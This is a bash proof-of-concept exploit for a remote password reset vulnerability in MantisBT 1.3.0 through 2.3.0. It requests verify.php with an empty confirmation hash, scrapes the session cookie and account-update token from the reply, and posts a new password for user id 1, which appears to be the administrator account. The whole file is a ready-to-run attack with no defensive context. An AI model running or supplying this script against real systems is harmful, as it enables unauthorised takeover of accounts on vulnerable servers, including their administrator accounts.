#!/bin/bash

url=$1
user=$2
pasw=$3

printf "\r\n(m4ud) Mantis >= v1.3.0 - 2.3.0 Remote Passowrd Reset\r\n"
printf "\r\n[+] Getting PHPSESSID and Token [+]\r\n"
req=$(curl -i -s "http://$url/mantisbt-2.3.0/verify.php?id=1&confirm_hash=" 2>&1)
cookie=$(echo "$req" |grep "PHPSESSID="|awk -F': ' '{print $2}'|awk -F";" '{print $1}'|grep -v "^$")
printf "Cookie: $cookie\r\n";
token=$(echo "$req"|grep 'ken" value='|awk -F'"' '{print $6}')
printf "Token: account_update_token=$token\r\n";
t="$token"
printf "\r\n[*] Changin $user password to $pasw [*]\r\n"
printf "\r\n[*] New passowrd should be ready ready! [*]"
curl -s -X POST "http://$url/mantisbt-2.3.0/account_update.php" -b "$cookie" --data "account_update_token=$t&password=$pasw&verify_user_id=1&realname=$user&password_confirm=$pasw" -s -o /dev/null 

